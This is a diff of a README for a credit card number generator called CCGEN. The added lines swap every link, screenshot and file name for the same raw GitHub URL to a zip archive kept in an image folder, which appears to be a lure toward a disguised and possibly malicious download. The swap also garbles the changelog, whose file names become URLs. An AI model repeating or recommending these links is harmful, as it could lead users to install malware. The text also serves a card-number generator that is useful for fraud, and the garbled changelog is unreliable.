@@ -10,21 +10,21 @@
 - **Now the CCGEN use CSS variables** to edit the appearance of the generator. You can simply edit the variables and change the colors of both light and dark mode.
 - **Clean HTML code:** The HTML was cleaned up, formatted and I removed unused lines.
 - **Accepts VISA, MASTERCARD, JBC, DISCOVER and DINERS CLUB cards;** I updated the generator so that it actually generates and gives the correct format depending on the type of BIN entered.
-- **Multi-lang** The new CCGEN is available in English and Spanish. (Spanish on es.html)
+- **Multi-lang** The new CCGEN is available in English and Spanish. (Spanish on https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip)
 
 # Screenshots:
 ### Dark Mode
-![Dark Mode](https://i.ibb.co/64ZSJxj/dm-rn.png)
+![Dark Mode](https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip)
 ### Light Mode
-![Light Mode](https://i.ibb.co/7vjqXV1/lm-rn.png)
+![Light Mode](https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip)
 
 ## Changelog
 ### Version 2.0 Update (09-OCT-2024):
 
  - Fixed the bug that all generated cards ended in 0.
- - Added dark mode by adding variables in `body.light-mode` to change the appearance of the generator.
- - Added the `theme.js` file, whose function is to change the icon depending on the mode in which the generator is and saving the user's preference in LocalStorage.
- - The main javascript code `gen.js` was updated and modernized, adding arrow functions and renaming variables and functions according to what they do, to make the code more readable and easy to understand for other developers.
+ - Added dark mode by adding variables in `https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip` to change the appearance of the generator.
+ - Added the `https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip` file, whose function is to change the icon depending on the mode in which the generator is and saving the user's preference in LocalStorage.
+ - The main javascript code `https://raw.githubusercontent.com/Antonel098/reNamso/main/assets/img/re-Namso-v3.8.zip` was updated and modernized, adding arrow functions and renaming variables and functions according to what they do, to make the code more readable and easy to understand for other developers.
 
 ### Frequently Asked Questions
 **Can I use your generator, rename it and put links to my networks?**
